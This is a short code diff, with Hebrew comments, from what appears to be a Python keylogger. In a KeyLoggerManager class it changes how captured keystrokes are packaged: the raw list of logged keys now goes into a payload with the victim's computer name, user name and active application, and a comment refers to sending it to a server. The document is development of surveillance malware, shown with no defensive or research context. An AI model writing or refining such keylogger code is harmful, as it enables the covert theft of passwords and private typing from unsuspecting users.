@@ -49,7 +49,6 @@ class KeyLoggerManager:
                 
                 # איסוף הנתונים שנאספו
                 logged_keys: list[str] = key_logger.get_logged_keys()
-                key_data: str = str(logged_keys) if logged_keys else "No keys pressed"
 
                 # יצירת המידע לשליחה
                 data_to_send: dict[str, str] = {
@@ -57,7 +56,7 @@ class KeyLoggerManager:
                     "computer_name": computer_name,
                     "user_name": user_name,
                     "active_app": active_app,  # הוספת האפליקציה הפעילה
-                    "keys": key_data
+                    "keys": logged_keys
                 }
 
                 # אם היה כשלון קודם, נוסיף אותו להודעה כדי שהשרת ידע
